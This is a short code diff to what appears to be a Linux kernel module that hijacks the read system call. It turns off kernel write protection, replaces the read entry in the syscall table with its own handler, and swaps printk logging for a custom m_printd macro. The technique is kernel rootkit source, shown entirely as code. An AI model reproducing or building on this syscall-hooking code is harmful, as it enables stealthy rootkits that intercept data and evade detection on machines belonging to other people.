@@ -1,7 +1,6 @@
 #include <linux/unistd.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/printk.h>
 #include <linux/kprobes.h>
 #include <linux/string.h>
 
@@ -15,10 +14,10 @@ void hijack_read(void)
     unsigned long old_cr0 = unprotect_memory();
 
     old_read = (sysfun_t)syscall_table[__NR_read];
-    printk(KERN_INFO "Old read @ %p", old_read);
+    m_printd(KERN_INFO "Old read @ %p", old_read);
 
     syscall_table[__NR_read] = (uint64_t)new_read;
-    printk(KERN_INFO "Hooked read(), new read @ %p", &syscall_table[__NR_read]);
+    m_printd(KERN_INFO "Hooked read(), new read @ %p", &syscall_table[__NR_read]);
     protect_memory(old_cr0);
 }
 
